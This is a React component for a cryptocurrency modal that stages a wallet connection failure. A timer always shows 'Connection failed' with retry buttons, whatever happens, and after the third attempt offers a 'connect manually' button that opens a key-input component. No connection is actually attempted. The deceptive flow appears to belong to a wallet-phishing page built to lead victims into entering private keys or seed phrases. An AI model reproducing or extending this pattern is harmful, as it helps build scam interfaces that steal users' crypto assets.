import { MdCancel } from "react-icons/md";
import { Button } from "react-bootstrap";
import { useState, useEffect } from "react";
import './styles.css'
import Inputkey from "./Inputkey";
import { styled } from '@mui/system';
import MyComponent from "./Canvas";

const Initmodel = ({setfirstmodal, activesrc}) => {
    const coinsrc = activesrc?.coin.src;
    const closepop = () => {
        setfirstmodal(false)
    }
    
    const [showinputkey, setshowinputkey] = useState(false);
    const [inputPlaceholder, setInputPlaceholder] = useState('initializing...');
    const [inputError, setInputError] = useState(false);
    const [showRetryButton, setShowRetryButton] = useState(false);
    const [showManualButton, setShowManualButton] = useState(false);
    const [attemptNumber, setAttemptNumber] = useState(1); // Track which attempt we're on
    const [isInitializing, setIsInitializing] = useState(true);

    const handleshowkey = () => {
        setshowinputkey(true)
    }

    const handleRetry = () => {
        setShowRetryButton(false);
        setInputPlaceholder('initializing...');
        setInputError(false);
        setIsInitializing(true);
        setAttemptNumber(prev => prev + 1);
    }

    const startInitializationCycle = () => {
        setTimeout(() => {
            if (attemptNumber === 1) {
                // First failure
                setInputPlaceholder("Connection failed");
                setInputError(true);
                setShowRetryButton(true);
                setIsInitializing(false);
            } else if (attemptNumber === 2) {
                // Second failure
                setInputPlaceholder("Connection failed");
                setInputError(true);
                setShowRetryButton(true);
                setIsInitializing(false);
            } else {
                // Final failure
                setInputPlaceholder("Error Connecting...");
                setInputError(true);
                setShowManualButton(true);
                setIsInitializing(false);
            }
        }, 5000);
    }

    useEffect(() => {
        if (isInitializing) {
            startInitializationCycle();
        }
        
        return () => clearTimeout();
    }, [isInitializing, attemptNumber]);

    const inputHolderClass = inputError ? 'inputholderchange' : 'inputholder';

    // Function to determine retry button text
    const getRetryButtonText = () => {
        if (attemptNumber === 1) return "retry(2)";
        if (attemptNumber === 2) return "retry(1)";
        return "";
    }

    return ( <>
        <div className="overlay">
            <div className="innermodal">
                <button onClick={closepop} className="modalbutton">
                    <MdCancel size={35} color="white" />
                </button>
                <div className="mainmodalinfo">
                    {activesrc && 
                        <div className="coindisplayinner">
                            <img className="coin-image" src={activesrc.coin.src} alt={activesrc.name} />
                            <p className='coin-name'>{activesrc.coin.name}</p>
                        </div>
                    }
                    <div className={inputHolderClass}>
                        <p className={inputError ? 'placeholder2' : 'placeholder1'}>
                            {inputPlaceholder}
                        </p> 

                        {showRetryButton && 
                            <Button onClick={handleRetry}>
                                {getRetryButtonText()}
                            </Button>
                        }

                        {showManualButton && 
                            <Button onClick={handleshowkey}>
                                connect manually
                            </Button>
                        }
                    </div>
                </div>
                {showinputkey && 
                    <Inputkey 
                        name={activesrc.coin.name} 
                        imgsrc={activesrc.coin.src}  
                        setshowinputkey={setshowinputkey} 
                        setfirstmodal={setfirstmodal}
                    />
                }
            </div>
            <MyComponent />  
            <div className="overlaycol" sx={{backgroundColor: 'rgba(0, 0, 0, 0.8)', filter: 'blur(150px)'}}></div>
        </div>
    </>);
}
 
export default Initmodel;